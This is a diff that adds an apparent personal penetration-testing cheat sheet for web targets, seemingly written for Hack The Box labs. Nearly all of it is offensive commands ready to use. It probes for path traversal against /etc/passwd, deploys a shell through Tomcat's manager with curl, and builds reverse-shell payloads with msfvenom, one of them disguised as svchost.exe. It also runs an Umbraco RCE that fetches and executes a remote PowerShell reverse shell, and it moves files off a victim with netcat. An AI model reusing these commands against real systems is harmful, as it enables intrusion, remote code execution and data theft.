@@ -1,0 +1,65 @@
+# This is for standard web commmand methodology
+
+#Vulnerability Scanning
+
+bash web-vuln.sh
+
+nikto
+
+
+#Directory Traversal
+
+dirb
+
+gobuster
+
+
+#SQL Injection
+
+#XSS
+
+#LFI_______________________
+
+
+
+______________________________
+|-check
+| |-.*php?file=../../../../../../etc/passwd
+|-execute
+| |- curl -v -u '<username>:<password>' -T <payload> '<Target URL>:8080/manager/text/deploy?path=/shell&update=true'
+|
+------------------------------
+#Exploit Dev
+
+#Payload Dev
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -f war > shell.war
+msfvenom -p LHOST=127.0.0.1 LPORT=5555	-f exe > svchost.exe
+
+#Payload Dropping
+
+Tomcat+++++++++++++++++++
+|-login with manager creds
+| |-Create shell
+| |-upload shell.war
+|  |-start nc -nvlp 5555
+|-------------------------
+|
+|+++++++++++++++++++++++
+
+EXDB Windows++++++++++++
+|-Locate exploit on ExploitDB and cd to paylaods folder
+| |-python umbraco-rce.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.144/Invoke-PowerShellTcp.ps1')"
+|
+|
+#Post exploitation
+
+NC Reverse Connection++++++++++++
+_________________________________
+|-getting file from target
+| |-on local
+|   |-nc -nvlp 5554 > <targetfile>
+| |-on victim
+|   |-nc <local IP> 5554 < <targetfile>
+-----------------------------------
+++++++++++++++++++++++++++++++++
